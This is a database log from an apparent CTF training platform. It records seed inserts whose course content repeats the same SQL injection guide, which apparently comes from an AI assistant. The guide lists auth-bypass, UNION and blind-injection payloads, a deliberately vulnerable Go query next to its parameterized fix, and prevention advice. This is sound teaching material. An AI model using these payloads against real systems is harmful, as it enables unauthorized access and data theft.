
## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,24) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.606ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[11.091ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.844','2025-06-09 14:07:53.844',NULL,'api security misconfigurations','Exploiting improperly secured REST/SOAP endpoints',240,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.615ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.682ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 25 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.576ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.857','2025-06-09 14:07:53.857',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,25) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.567ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.669ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.866','2025-06-09 14:07:53.866',NULL,'weak encryption algorithms','Breaking deprecated ciphers (DES, RC4)',220,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.644ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.485ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 26 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.886ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.874','2025-06-09 14:07:53.874',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,26) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.375ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[12.096ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.888','2025-06-09 14:07:53.888',NULL,'rsa key factorization','Cracking short RSA keys (<= 1024 bits)',210,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.584ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.442ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 27 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[15.502ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.899','2025-06-09 14:07:53.899',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,27) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.045ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.388ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.914','2025-06-09 14:07:53.914',NULL,'hash collision attacks','Exploiting MD5/SHA-1 weaknesses',120,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.951ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.460ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 28 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[13.955ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.927','2025-06-09 14:07:53.927',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,28) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.769ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

